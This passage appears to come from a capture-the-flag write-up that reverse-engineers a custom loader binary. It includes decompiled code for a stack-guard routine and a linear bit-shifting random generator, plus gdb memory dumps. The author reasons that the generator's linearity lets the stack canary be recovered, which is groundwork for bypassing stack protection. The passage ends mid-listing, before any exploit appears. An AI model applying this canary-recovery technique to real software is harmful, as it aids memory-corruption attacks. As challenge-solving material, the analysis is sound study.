<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">void</span> <span style="color:#c0f">write_stack_guard</span>(undefined8 param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">long</span> in_FS_OFFSET;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  <span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(in_FS_OFFSET <span style="color:#555">+</span> <span style="color:#f60">0x28</span>) <span style="color:#555">=</span> param_1;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Basically what this method wants to aim is to generate the <code>canary</code> value from the custom <code>rand()</code> method. Also if you read the assembly, before calling <code>rand()</code>, it set the <code>edi</code> to <code>0x40</code>:</p>
<p><p class="markdown-image">
  <img src="https://i.imgur.com/VQQgYIT.png" alt=""  />
</p></p>
<p>Let&rsquo;s check the <code>rand()</code> method to understand better how it generates the canary value.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#078;font-weight:bold">int</span> <span style="color:#c0f">rand</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> in_EDI;
</span></span><span style="display:flex;"><span>  <span style="color:#078;font-weight:bold">int</span> local_14;
</span></span><span style="display:flex;"><span>  ulong local_10;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  local_10 <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">for</span> (local_14 <span style="color:#555">=</span> <span style="color:#f60">0</span>; local_14 <span style="color:#555">&lt;</span> in_EDI; local_14 <span style="color:#555">=</span> local_14 <span style="color:#555">+</span> <span style="color:#f60">1</span>) {
</span></span><span style="display:flex;"><span>    bVar1 <span style="color:#555">=</span> rand_get_bit();
</span></span><span style="display:flex;"><span>    local_10 <span style="color:#555">=</span> local_10 <span style="color:#555">&lt;&lt;</span> <span style="color:#f60">1</span> <span style="color:#555">|</span> (ulong)bVar1;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> (<span style="color:#078;font-weight:bold">int</span>)local_10;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>byte <span style="color:#c0f">rand_get_bit</span>(<span style="color:#078;font-weight:bold">void</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  byte bVar1;
</span></span><span style="display:flex;"><span>  byte bVar2;
</span></span><span style="display:flex;"><span>  byte bVar3;
</span></span><span style="display:flex;"><span>  byte bVar4;
</span></span><span style="display:flex;"><span>  
</span></span><span style="display:flex;"><span>  bVar1 <span style="color:#555">=</span> rand_extract_bit(<span style="color:#f60">0x3f</span>);
</span></span><span style="display:flex;"><span>  bVar2 <span style="color:#555">=</span> rand_extract_bit(<span style="color:#f60">0x3d</span>);
</span></span><span style="display:flex;"><span>  bVar3 <span style="color:#555">=</span> rand_extract_bit(<span style="color:#f60">0x3c</span>);
</span></span><span style="display:flex;"><span>  bVar4 <span style="color:#555">=</span> rand_extract_bit(<span style="color:#f60">0x3a</span>);
</span></span><span style="display:flex;"><span>  bVar1 <span style="color:#555">=</span> bVar4 <span style="color:#555">^</span> bVar1 <span style="color:#555">^</span> bVar2 <span style="color:#555">^</span> bVar3 <span style="color:#555">^</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  rand_state <span style="color:#555">=</span> (ulong)bVar1 <span style="color:#555">|</span> rand_state <span style="color:#555">*</span> <span style="color:#f60">2</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> bVar1;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>uint <span style="color:#c0f">rand_extract_bit</span>(byte param_1)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">return</span> (uint)(rand_state <span style="color:#555">&gt;&gt;</span> (param_1 <span style="color:#555">&amp;</span> <span style="color:#f60">0x3f</span>)) <span style="color:#555">&amp;</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></td></tr></table>
</div>
</div><p>To explain this, basically, the way <code>rand</code> work is:</p>
<ul>
<li>Set <code>edi</code> before calling <code>rand()</code>. <code>edi</code> will be used as how many bits do the random integer that we want to generate. In this case, it is 64-bit (0x40).</li>
<li><code>rand_extract_bit(n)</code> is basically a function that will just take the n-th bit of the <code>rand_state</code></li>
<li><code>rand_get_bit()</code> is basically will generate a bit which is the result of:
<ul>
<li><code>rand_extract_bit(63) ^ rand_extract_bit(61) ^ rand_extract_bit(60) ^ rand_extract_bit(58) ^ 1</code>.</li>
<li>And also notice that after generating the random bit, it will remove the MSB of the <code>rand_state</code> by doing a left shift by 1 (<code>&lt;&lt; 1</code>), and then put the generated bit as the new LSB.</li>
</ul>
</li>
</ul>
<p>The rand method is pretty linear, so keep in mind that we might be able to recover this <code>rand_state</code> if we know enough of the result of <code>rand()</code> values.</p>
<p>Back to the <code>init_stack_guard</code> method, one of the important thing that we can notice from this method is that after calling this <code>rand()</code>, <strong>the <code>canary</code> is basically will be set as the latest <code>rand_state</code></strong>, which mean after this call, the next n <code>rand()</code> calls will be based on the <code>canary</code> of the binary as its initial state. This piece of information will be useful later.</p>
<h5 id="load-the-given-object-files-to-the-loader">Load the given object files to the loader <a href="#load-the-given-object-files-to-the-loader" class="anchor">#</a></h5>
<p>Now, let&rsquo;s move to the below LOC</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>local_c <span style="color:#555">=</span> <span style="color:#f60">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#069;font-weight:bold">while</span> (<span style="color:#555">*</span>(<span style="color:#078;font-weight:bold">long</span> <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_c <span style="color:#555">*</span> <span style="color:#f60">8</span>) <span style="color:#555">!=</span> <span style="color:#f60">0</span>) {
</span></span><span style="display:flex;"><span>    load_o_phase_1(o_ctx <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_c <span style="color:#555">*</span> <span style="color:#f60">0x268</span>,<span style="color:#555">*</span>(undefined8 <span style="color:#555">*</span>)(files <span style="color:#555">+</span> (<span style="color:#078;font-weight:bold">long</span>)local_c <span style="color:#555">*</span> <span style="color:#f60">8</span>));
</span></span><span style="display:flex;"><span>    local_c <span style="color:#555">=</span> local_c <span style="color:#555">+</span> <span style="color:#f60">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span></code></pre></td></tr></table>
</div>
</div><p>What is <code>files</code>? Inspecting it via gdb, it is an array consisting of our object filenames. (Notes that the <code>loader</code> binary is No PIE, so the address of global variables such as <code>files</code> and <code>rand_state</code> is consistent, which in this case, <code>files</code> address is <code>0x4041e0</code>).</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>gef‚û§  x/10gx 0x4041e0
</span></span><span style="display:flex;"><span>0x4041e0 &lt;files&gt;:	0x0000000000403000	0x0000000000403007
</span></span><span style="display:flex;"><span>0x4041f0 &lt;files+16&gt;:	0x0000000000403012	0x000000000040301a
</span></span><span style="display:flex;"><span>0x404200 &lt;files+32&gt;:	0x0000000000403022	0x0000000000403029
</span></span><span style="display:flex;"><span>0x404210 &lt;files+48&gt;:	0x000000000040302f	0x0000000000000000
</span></span><span style="display:flex;"><span>0x404220 &lt;o_info&gt;:	0x0000000000000000	0x0000000000000000
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x403000
</span></span><span style="display:flex;"><span>0x403000:	&#34;main.o&#34;
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x403007
</span></span><span style="display:flex;"><span>0x403007:	&#34;syscalls.o&#34;
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x403012
</span></span><span style="display:flex;"><span>0x403012:	&#34;guard.o&#34;
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x40301a
</span></span><span style="display:flex;"><span>0x40301a:	&#34;basic.o&#34;
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x403022
</span></span><span style="display:flex;"><span>0x403022:	&#34;game.o&#34;
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x403029
</span></span><span style="display:flex;"><span>0x403029:	&#34;res.o&#34;
</span></span><span style="display:flex;"><span>gef‚û§  x/s 0x40302f
</span></span><span style="display:flex;"><span>0x40302f:	&#34;debug.o&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p>So, that LOC will iterate an array of object filenames, and then pass it to the <code>load_o_phase_1</code> method. To understand it better, let&rsquo;s check the method decompiled result.</p>
<div class="highlight"><div style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  1
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  2
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  3
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  4
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  5
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  6
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  7
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  8
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">  9
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 10
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 11
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 12
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 13
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 14
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 15
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 16
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 17
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 18
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 19
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 20
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 21
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 22
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 23
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 24
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 25
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 26
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 27
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 28
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 29
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 30
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 31
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 32
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 33
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 34
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 35
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 36
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 37
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 38
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 39
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 40
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 41
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 42
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 43
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 44
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 45
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 46
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 47
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 48
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 49
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 50
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 51
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 52
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 53
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 54
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 55
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 56
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 57
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 58
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 59
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 60
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 61
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 62
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 63
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 64
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 65
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 66
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 67
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 68
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 69
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 70
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 71
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 72
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 73
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 74
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 75
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 76
</span><span style="white-space:pre;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 77
